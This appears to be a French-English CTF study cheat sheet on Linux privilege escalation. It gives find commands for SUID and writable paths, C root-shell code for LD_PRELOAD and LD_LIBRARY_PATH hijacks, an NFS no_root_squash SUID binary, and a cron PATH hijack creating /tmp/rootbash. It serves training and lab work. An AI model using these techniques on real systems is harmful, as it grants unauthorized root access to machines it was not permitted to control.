# Linux

Des techniques pour de la PrivEsc sur linux !

## Commande find

```
- find . -name flag1.txt: find the file named “flag1.txt” in the current directory
- find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
- find / -type d -name config: find the directory named config under “/”
- find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
- find / -perm a=x: find executable files
- find /home -user frank: find all files for user “frank” under “/home”
- find / -mtime 10: find files that were modified in the last 10 days
- find / -atime 10: find files that were accessed in the last 10 day
- find / -cmin -60: find files changed within the last hour (60 minutes)
- find / -amin -60: find files accesses within the last hour (60 minutes)
- find / -size 50M: find files with a 50 MB size

- find / -type f -perm -04000 -ls 2>/dev/null
- find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 

- find / -writable -type d 2>/dev/null  : Find world-writeable folders
- find / -perm -222 -type d 2>/dev/null : Find world-writeable folders
- find / -perm -o w -type d 2>/dev/null : Find world-writeable folders
- find / -perm -o x -type d 2>/dev/null : Find world-executable folders

Find development tools and supported languages:

- find / -name perl*
- find / -name python*
- find / -name gcc*
```
## LD_PRELOAD

```
The steps of this privilege escalation vector can be summarized as follows;

    Check for LD_PRELOAD (with the env_keep option)
    Write a simple C code compiled as a share object (.so extension) file
    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

## NFS

```
cat /etc/exports
```

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/abe3fe15-addc-4f91-8150-3dd064e5e346)

tout ce qui contient "no_root_squash" est suscpetible de permettre un PrivEsc.
<br>
Pour checker les repertoires à distance
[Attaquant]
```
showmount -e <ip_distante>
```
```
mount -o rw <ip_distante>:/backups /tmp/backup
```
Script 'privEsc.c'

```
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

```
gcc privEsc.c -o privEsc -w
chmod +s privEsc
```

[Victime]
```
./privEsc
```
<br>
<br>
## Sudo - Environment Variables

Quand `sudo -l` si LD_PRELOAD ou LD_LIBRARY_PATH, qui sont des librairies partagées, il est possible de faire un PrivEsc avec 

Créer un objet partagé dans le répertoire `/home/user/tools/sudo/preload.c`
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
Script `preload.c`
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

```

### Apache2 & LD_LIBRARY_PATH

Pour savoir quelles librairies sont utilisées avec apache2

```
ldd /usr/sbin/apache2
```
Créer un objet partagé avec le même nom que un de ceux qui ont été affiché

```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Lancé apache2 avec sudo 

```
sudo LD_LIBRARY_PATH=/tmp apache2
```

Script `library_path.c`

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

<br>
<br>
## Cron Jobs - PATH Environment Variable

Exemple
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

Checker la variable `PATH` dans /etc/crontab, choper un endroit qui est `writable` par notre utilisateur et y créer un petit script `overwrite.sh` dans `/home/user`

```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
```
chmod +x overwrite.sh
```

puis 

```
/tmp/rootbash -p
```
